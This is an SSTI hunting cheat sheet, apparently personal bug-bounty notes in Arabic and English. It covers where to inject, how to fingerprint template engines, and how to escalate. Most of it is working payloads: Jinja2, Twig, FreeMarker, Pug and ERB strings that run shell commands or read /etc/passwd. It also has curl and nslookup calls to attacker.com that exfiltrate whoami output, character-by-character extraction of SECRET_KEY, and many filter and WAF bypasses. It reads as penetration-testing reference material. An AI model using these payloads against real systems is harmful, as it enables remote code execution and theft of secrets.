


# 🚨 Server-Side Template Injection (SSTI)

---

## 🔎 1️⃣ Where To Look (أماكن الصيد)

### 🎯 High-Risk Features

- Email template preview
    
- Invoice / PDF generation
    
- CMS preview
    
- Admin custom templates
    
- Log viewer
    
- Profile greeting
    
- “Preview before publish”
    
- Error page customization
    

### 🚩 Parameters

```
name=
username=
email=
message=
template=
preview=
view=
page=
content=
```

---

# 🧪 2️⃣ Detection Phase

## 🔹 Generic Fuzz

```
${{<%[%'"}}%\
```

لو حصل:

- 500 error
    
- Syntax error
    
- Page layout اتغير
    
- أجزاء اختفت
    

➡️ احتمال SSTI

---

## 🔹 Arithmetic Test (Golden Test)

جرب كل ده:

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{ 7*7 }
{{= 7*7 }}
{= 7*7 }
\n= 7*7 \n
*{7*7}
@{7*7}
@(7*7)
```

لو رجع **49**  
➡️ Execution Confirmed

لو مفيش Output  
➡️ احتمال Blind SSTI

---

# 🧠 3️⃣ Identify Template Engine

| Engine                | Detect Payload |
| --------------------- | -------------- |
| **Jinja2**            | `{{7*7}}`      |
| **Twig**              | `{{7*7}}`      |
| **Apache FreeMarker** | `${7*7}`       |
| **ERB**               | `<%=7*7%>`     |
| **Pug**               | `#{7*7}`       |
| **ASP.NET Razor**     | `@(7*7)`       |


# 🧠 Advanced Trick (WAF Bypass)

لو فيه فلترة على:

`{{ }}`

جرب:

`{% set x=7*7 %}{{x}}`

أو:

`${{7*7}}`

أو URL encoding

---

# 💣 4️⃣ Exploit – Visible SSTI

---

## 🐍 Jinja2

### Info Leak

```jinja2
{{config}}
{{self}}
```

### File Read

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
```

### RCE

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

---

## 🟣 Twig

### File Read

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### RCE

```twig
{{['id']|filter('system')}}
```

---

## ☕ FreeMarker

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## 🍃 Pug

```pug
#{global.process.mainModule.require('child_process').execSync('id')}
```

---

## 💎 ERB

```erb
<%= system("id") %>
```

---

# 🕶 5️⃣ Blind SSTI Section

---

# 🧪 A) Time-Based Detection

### 🐍 Jinja2

```jinja2
{{ cycler.__init__.__globals__.os.system('sleep 5') }}
```

### ☕ FreeMarker

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
```

### 🍃 Pug

```pug
#{global.process.mainModule.require('child_process').execSync('sleep 5')}
```

لو الـ response اتأخر 5 ثواني  
➡️ Blind SSTI Confirmed

---

# 📡 B) Out-of-Band (OOB)

خلي السيرفر يعمل request ليك:

### 🐍 Jinja2

```jinja2
{{ cycler.__init__.__globals__.os.system('curl http://attacker.com/$(whoami)') }}
```

### DNS Exfiltration

```jinja2
{{ cycler.__init__.__globals__.os.system('nslookup $(whoami).attacker.com') }}
```

لو شفت request في:

- Burp Collaborator
    
- Interactsh
    

➡️ Execution Confirmed

---

# 🔎 C) Boolean-Based Extraction

```jinja2
{{ 1 if config.SECRET_KEY.startswith('A') else 0 }}
```

راقب:

- Content length
    
- Status code
    
- Redirect
    
- Response time
    

واستخرج البيانات حرف حرف.

---

# 🧠 Blind SSTI Strategy

```
1️⃣ Inject sleep
2️⃣ Confirm delay
3️⃣ Confirm command execution
4️⃣ Use OOB channel
5️⃣ Extract secrets
6️⃣ Escalate to reverse shell
```

---
# 🧬 6️⃣ Advanced Filter & WAF Bypass



## 🚫 لو {{ }} متفلترة

```
{% set x=7*7 %}{{x}}  
{% if 7*7==49 %}YES{% endif %}
```

---

## 🚫 لو `.` متفلترة

`cycler|attr("__init__")|attr("__globals__")`

---

## 🚫 لو `_` متفلترة

`attr("\x5f\x5finit\x5f\x5f")`

---

## 🚫 لو [ ] متفلترة

استخدم:

`|attr("__getitem__")`

أو tuple بدل list

---

## 🔤 String Construction

```
{{ "o" ~ "s" }}  
{{ ["o","s"]|join }}
```

---

## 🧠 Parameter Smuggling

بدل:

`request.__class__`

استخدم:

`request|attr(request.args.param)`

وأرسل:

`&param=__class__`

---

# 🆕 7️⃣ NEW – Regex Linefeed Bypass

لو الفلتر:

`/^[0-9a-z]+$/`

في **Ruby**:

`^` و `$` بيشتغلوا على كل سطر.

Payload:

```
abc  
<%= 7*7 %>
```

✔ السطر الأول يعدي  
✔ التاني يتنفذ

الحل الصح في Ruby:

`\A \z`

في **Python**  
لازم `re.MULTILINE` عشان يحصل نفس السلوك.

💡 ده اسمه:

> Validation / Execution Context Mismatch

---

# 🆕 8️⃣ Double Rendering Attack

سيناريو خطير:

`render_template(user_input)`

وبعدين:

`render_template_string(result)`

ده شائع في:  
**Flask**

➡️ تقدر تعمل nested SSTI

---

# 🆕 9️⃣ CPU-Based Blind Execution

لو sleep متفلترة:

`{% for i in range(10**8) %}{% endfor %}`

---

# 🆕 🔟 Encoding Tricks

### URL Encoding

`%7B%7B7*7%7D%7D`

### Double Encoding

`%257B%257B7*7%257D%257D`

### Unicode

`\u007b\u007b7*7\u007d\u007d`

---

# 🧠 11️⃣ Subclass Traversal (Jinja2)

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

منها توصل لـ:

- subprocess
    
- file
    
- warnings
    
- etc.
    

---

# 🎯 12️⃣ Context Variable Abuse

`{{config}}`  
`{{request}}`  
`{{session}}`  
`{{g}}`

ممكن تلاقي:

- SECRET_KEY
    
- DB creds
    
- API tokens
    

---

# 🛡 13️⃣ WAF Evasion Tricks

✔ Case manipulation  
✔ Whitespace injection  
✔ Tabs بدل spaces  
✔ Inline comments  
✔ String concatenation  
✔ Hex encoding  
✔ Parameter splitting  
✔ Newline injection  
✔ Double render abuse


---

# 🛠 Tools

- TInjA
    
- SSTImap
    
- tplmap
    
- Burp Collaborator
    
- Interactsh
    

---

## More Exploits
(https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#more-exploits)

Check the rest of [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injectio](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---

# 🧬 Advanced SSTI Filter Bypass

---

# 🧱 1️⃣ Bypass Blacklisted Characters

## 🚫 لو {{ }} متفلترة

### 🐍 Jinja2 – استخدم control blocks

بدل:

```jinja2
{{7*7}}
```

جرب:

```jinja2
{% set x = 7*7 %}{{x}}
```

أو:

```jinja2
{% if 7*7 == 49 %}YES{% endif %}
```

---

## 🚫 لو `.` متفلترة

بدل:

```jinja2
cycler.__init__.__globals__
```

استخدم:

```jinja2
cycler|attr("__init__")|attr("__globals__")
```

---

## 🚫 لو `_` متفلترة

استخدم Hex encoding:

```jinja2
attr("\x5f\x5finit\x5f\x5f")
```

---

# 🔤 2️⃣ String Construction Bypass

لو الكلمات دي متفلترة:

```
os
system
popen
import
```

## 🧠 Dynamic Build

```jinja2
{{().__class__.__mro__[1].__subclasses__()}}
```

أو build string حرف حرف:

```jinja2
{{ "o" ~ "s" }}
```

أو:

```jinja2
{{ ["o","s"]|join }}
```

---

# 🧩 3️⃣ Access Without Direct Reference

بدل:

```jinja2
os.system("id")
```

استخدم object traversal:

```jinja2
{{ cycler.__init__.__globals__['os'].popen('id').read() }}
```

أو:

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

---

# 🧠 4️⃣ Bypass Using Filters

لو فيه فلترة على method calls:

```jinja2
{{ "id"|attr("__class__") }}
```

أو:

```jinja2
{{ request|attr("application") }}
```

---

# 🔢 5️⃣ Numeric-Based Bypass

لو الأرقام متفلترة:

```jinja2
{{ True + True }}
```

أو:

```jinja2
{{ range(10)|length }}
```

---

# 🧪 6️⃣ Blind SSTI Bypass Tricks

## ⏱ بدل sleep

لو sleep متفلترة:

### 🐍 Jinja2 CPU loop

```jinja2
{% for i in range(10**8) %}{% endfor %}
```

---

## 📡 DNS Without nslookup

لو nslookup blocked:

```jinja2
{{ cycler.__init__.__globals__.os.system('ping attacker.com') }}
```

أو:

```jinja2
{{ cycler.__init__.__globals__.os.system('curl attacker.com') }}
```

---

# 🔁 7️⃣ Encoding Bypass

## URL Encoding

```
%7B%7B7*7%7D%7D
```

## Double Encoding

```
%257B%257B7*7%257D%257D
```

## Unicode

```
\u007b\u007b7*7\u007d\u007d
```

---

# 🧨 8️⃣ Alternative Execution Paths

## 🐍 Jinja2 subclass traversal

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

من هناك تلاقي:

- subprocess
    
- file
    
- warnings.catch_warnings
    
- etc.
    

---

# 🎯 9️⃣ Context Variable Abuse

أحيانًا في:

```jinja2
{{config}}
{{request}}
{{session}}
{{g}}
```

ممكن توصل لـ:

- SECRET_KEY
    
- DB credentials
    
- API tokens
    

حتى بدون RCE = Critical

---

# 🛡️ 10️⃣ WAF Evasion Ideas

✔️ Case manipulation  
✔️ Whitespace injection  
✔️ Tabs بدل space  
✔️ Comments

```jinja2
{{ cycler
.__init__
.__globals__
.os
.popen('id')
.read() }}
```

أو:

```jinja2
{{ cycler/**/.__init__/**/.__globals__ }}
```


---

# 🏆 Pro-Level Workflow

```
1️⃣ Detect SSTI
2️⃣ Identify Engine
3️⃣ Test blacklist
4️⃣ Reconstruct blocked strings
5️⃣ Achieve execution
6️⃣ Switch to OOB if blind
7️⃣ Extract secrets
```

---

